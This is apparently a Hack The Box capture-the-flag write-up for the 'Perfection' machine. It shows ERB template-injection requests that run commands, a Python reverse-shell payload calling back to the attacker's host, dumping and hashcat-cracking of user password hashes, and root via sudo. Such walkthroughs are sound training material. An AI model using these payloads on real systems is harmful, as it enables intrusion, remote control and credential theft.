# Reconnaissances 
## Port Scan
```
$ nmap -sC -sV -v 10.10.11.253
```
```
Nmap scan report for 10.10.11.253
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Observe the HTTP port
```
$ dirb http://10.10.11.253 
$ firefox http://10.10.11.253 
```

**Search for exploit**
```
$ searchsploit webrick 
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Ruby 1.9 - 'WEBrick::HTTP::DefaultFileHandler' Crafted HTTP Request Denial of Service                                                     | multiple/dos/32222.rb
Ruby 1.9.1 - WEBrick 'Terminal Escape Sequence in Logs' Command Injection                                                                 | multiple/remote/33489.txt
Ruby on Rails 3.0.5 - 'WEBrick::HTTPRequest' Module HTTP Header Injection                                                                 | multiple/remote/35352.rb
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                
```

Search `webrick 1.7.0 exploit` in Google and get this Exploit-DB url:
```
https://www.exploit-db.com/exploits/5215
https://security.snyk.io/package/rubygems/webrick
```

Try the exploit
```
This vulnerability has the following impacts.
1. Attacker can access private files by sending a url with url encoded backslash (\). This exploit works only on systems that accept backslash as a path separator.

Example:

http://[server]:[port]/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini


2. Attacker can access files that matches to the patterns specified by the :NondisclosureName option (the default value is [".ht*", "*~"]). This exploit works only on systems that use case insensitive filesystems.
```
```bash
$ curl http://10.10.11.253/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
```
<!DOCTYPE html>
<html>
<head>
  <style type="text/css">
  body { text-align:center;font-family:helvetica,arial;font-size:22px;
    color:#888;margin:20px}
  #c {margin:0 auto;width:500px;text-align:left}
  </style>
</head>
<body>
  <h2>Sinatra doesn’t know this ditty.</h2>
  <img src='http://127.0.0.1:3000/__sinatra__/404.png'>
  <div id="c">
    Try this:
    <pre>get &#x27;&#x2F;etc&#x2F;passwd&#x27; do
  &quot;Hello World&quot;
end
</pre>
  </div>
</body>
</html>

```

Search for the error message
```
https://security.snyk.io/package/rubygems/sinatra
```

Intercept the calculator function
```http
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade
Upgrade-Insecure-Requests: 1

category1=Test1&grade1=51&weight1=60&category2=Test2&grade2=10&weight2=20&category3=Test3&grade3=10&weight3=10&category4=Test4&grade4=10&weight4=10&category5=N%2FA&grade5=0&weight5=0
```

### SSTI Exploit
Payload refer to: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
```
ERB (Ruby)
[](#erb-ruby)
- `{{7*7}} = {{7*7}}`
- `${7*7} = ${7*7}`
- `<%= 7*7 %> = 49`
- `<%= foobar %> = Error`
```
```http
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 201
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade
Upgrade-Insecure-Requests: 1

category1=Test1%0a<%25%3d+7*7+%25>&grade1=51&weight1=60&category2=Test2&grade2=10&weight2=20&category3=Test3&grade3=10&weight3=10&category4=Test4&grade4=10&weight4=10&category5=N%2FA&grade5=0&weight5=0
```

Command Execution:
```http
category1=Test1%0a<%25%3d+`ls+-lh`+%25>&grade1=51&weight1=60&category2=Test2&grade2=10&weight2=20&category3=Test3&grade3=10&weight3=10&category4=Test4&grade4=10&weight4=10&category5=N%2FA&grade5=0&weight5=0
```
```
total 12K
-rw-r--r-- 1 root susan 2.5K Oct 25 12:34 main.rb
drwxr-xr-x 5 root susan 4.0K Oct 27 10:36 public
drwxr-xr-x 2 root susan 4.0K Oct 27 10:36 views
```

Test Connection:
```http
category1=Test1%0a<%25%3d+`ping+-c+4+10.10.14.34`+%25>&grade1=51&weight1=60&category2=Test2&grade2=10&weight2=20&category3=Test3&grade3=10&weight3=10&category4=Test4&grade4=10&weight4=10&category5=N%2FA&grade5=0&weight5=0
```
```
Test1
PING 10.10.14.34 (10.10.14.34) 56(84) bytes of data.
64 bytes from 10.10.14.34: icmp_seq=1 ttl=63 time=22.5 ms
64 bytes from 10.10.14.34: icmp_seq=2 ttl=63 time=46.0 ms
64 bytes from 10.10.14.34: icmp_seq=3 ttl=63 time=72.6 ms
64 bytes from 10.10.14.34: icmp_seq=4 ttl=63 time=92.0 ms

--- 10.10.14.34 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
```

### Create ReverseShell
```
 nc -lnvp 9001 
listening on [any] 9001 ...
```

Generate payload: Refer to: https://www.revshells.com/
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.34",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Send the request
```http
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 436
Origin: http://10.10.11.253
Connection: close
Referer: http://10.10.11.253/weighted-grade
Upgrade-Insecure-Requests: 1

category1=Test1%0a<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.34",9001))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")'`+%25>&grade1=51&weight1=60&category2=Test2&grade2=10&weight2=20&category3=Test3&grade3=10&weight3=10&category4=Test4&grade4=10&weight4=10&category5=N%2FA&grade5=0&weight5=0;
```

Then
```bash
listening on [any] 9001 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.11.253] 57734
susan@perfection:~/ruby_app$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
python3 -c 'import pty;pty.spawn("/bin/bash")'
susan@perfection:~/ruby_app$ ^Z
zsh: suspended  nc -lnvp 9001
            
┌──(kali㉿kali)-[~/…/PlayGround/HTB/Machines/Perfection]
└─$ stty raw -echo;fg              
[1]  + continued  nc -lnvp 9001

susan@perfection:~/ruby_app$ export TERM=xterm
susan@perfection:~/ruby_app$ cd
susan@perfection:~$ cat user.txt 
9e259014b1b0729c99537cf8325e0e10

```

# Lateral Movement
```bash
susan@perfection:~$ ls
Migration  revshell.elf  ruby_app  user.txt
susan@perfection:~$ cd Migration/
susan@perfection:~/Migration$ ls
pupilpath_credentials.db
susan@perfection:~/Migration$ file pupilpath_credentials.db 
pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002,
```
```sqlite
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .table
users
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
sqlite>
```
```
$ hash-identifier                                        
   #########################################################################
--------------------------------------------------
 HASH: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------

```

### Run linpeas.sh
```
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                       
OS: Linux version 5.15.0-97-generic (buildd@lcy02-amd64-033) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #107-Ubuntu SMP Wed Feb 7 13:26:48 UTC 2024
User & Groups: uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
Hostname: perfection
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)     
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                        
```
```
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root susan 625 May 14  2023 /var/mail/susan
-rw-r----- 1 root susan 33 Mar  5 07:07 /home/susan/user.txt
```
```
susan@perfection:~$ cat /var/mail/susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

### Crack the susan password
```
$ hashcat -m 1400 -a 3 susan_hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 1439/2943 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
```
Password: `susan_nasus_413759210`

# Got Root
```
susan@perfection:~$ sudo -l
[sudo] password for susan: susan_nasus_413759210
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
susan@perfection:~$ sudo bash
root@perfection:/home/susan# cat /root/root.txt
d140f08a6864b915b210435db3fed02a
```